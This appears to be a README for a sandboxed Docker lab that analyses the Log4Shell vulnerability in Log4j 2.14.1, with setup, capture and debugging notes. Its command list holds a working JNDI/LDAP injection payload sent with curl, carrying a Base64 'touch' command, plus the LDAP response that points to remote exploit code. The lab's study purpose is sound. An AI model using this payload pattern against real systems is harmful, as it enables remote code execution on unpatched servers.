# Apache Log4j CVE-2021-44228

## 0verview

AKA: *Log4Shell*

[CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

Caused and categorised by "Improper Input Validation"

Apache Log4j library [download](https://archive.apache.org/dist/logging/log4j/)

Vulnerable version: [apache-log4j-2.14.1](https://archive.apache.org/dist/logging/log4j/2.14.1/apache-log4j-2.14.1-bin.zip)

Fixed version: [apache-log4j-2.15.0](https://archive.apache.org/dist/logging/log4j/2.15.0/apache-log4j-2.15.0-bin.zip)

Tutorial: [https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/](https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/)

## Objectives

1. Analyse Java execution flow within vulnerable application code and log4j library
1. Analyse Network traffic associated with relevant nodes (Application & LDAP Server)
1. Analyse LDAP exploit server and determine how exploit is deployed/architected

## Methodology

### Lab implementation

Docker will be used to provide a sand-boxed environment consisting of the following nodes:

- Vulnerable Application
- LDAP exploit server
- Wireshark instance (optional)
- Docker network

Docker Compose will be used to aid operation and testing.

Wireshark can either be run as a Docker instance (Linux Server Wireshark) or `tcpdump` can be utilised to capture packets and produce a pcap file for later analysis in Wireshark.

__Vulnerable Application__

For stepping through the code create a basic Java application using `log4j` for logging.

Use VSCode with remoting feature to connect to the running Container and perform runtime debugging.

__LDAP Server exploit__

Use Dockerised LDAP exploit server from [Cygenta - how to build your own demo](https://www.cygenta.co.uk/post/your-own-log4shell-demo).

__Wireshark__

Use a variation of Docker configuration found here: [https://docs.linuxserver.io/images/docker-wireshark](https://docs.linuxserver.io/images/docker-wireshark)

__Commands__

```shell
# start all services
$> docker compose up

# stop all services
$> docker compose down

# clean up all Docker artifacts (including stop all services)
$> ./scripts/cleanup.sh

# test the Docker services and network
$> ./scripts/test.sh

# test if exploit has been successful
$> docker compose exec vulnapp ls -l /tmp

# run interactive shell on tools image container
$> docker run --name tools --network example_log4j -it --privileged tools

# inside tools container
$> curl vulnapp:8080 -H 'X-Api-Version: ${jndi:ldap://log4jldapserver:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9DeWdlbnRhRGVtbw==}'

# install tcpdump on service container (Alpine)
$> docker compose exec <srvcname> apk add tcpdump

# extract log from contanier
$> docker compose cp <srvcname>:/tmp/dump.log .

# get interactive shell on srvc container
$> docker compose exec <srvcname> sh

# run tcpdump in container
$> tcpdump -i eth0 -w /tmp/dump.cap &

# ldap search
$> ldapsearch -p 1389 -h log4jldapserver -x -b "Basic/Command/Base64/dG91Y2ggL3RtcC9DeWdlbnRhRGVtbw=="
```

```shell
# ldap search response

# extended LDIF
#
# LDAPv3
# base <Basic/Command/Base64/dG91Y2ggL3RtcC9DeWdlbnRhRGVtbw==> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

#
dn: Basic/Command/Base64/dG91Y2ggL3RtcC9DeWdlbnRhRGVtbw==
javaClassName: foo
javaCodeBase: http://log4jldapserver:8888/
objectClass: javaNamingReference
javaFactory: ExploitzhlIBZLvCq

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

## Notes

### Log4j Lookup Feature

[Apache log4j lookups docs](https://logging.apache.org/log4j/2.x/manual/lookups.html)

### Troubleshooting

- Keep getting Error in VSCode: Java server has crashed 5 times in the last 3 minutes
> Solution: F1 -> Java: Clean the Java Language Server Workspace -> Restart & Delete

## Debugging notes

PatternLayout.toSerializable
ln: 344
iteration 8 goes bang!!!

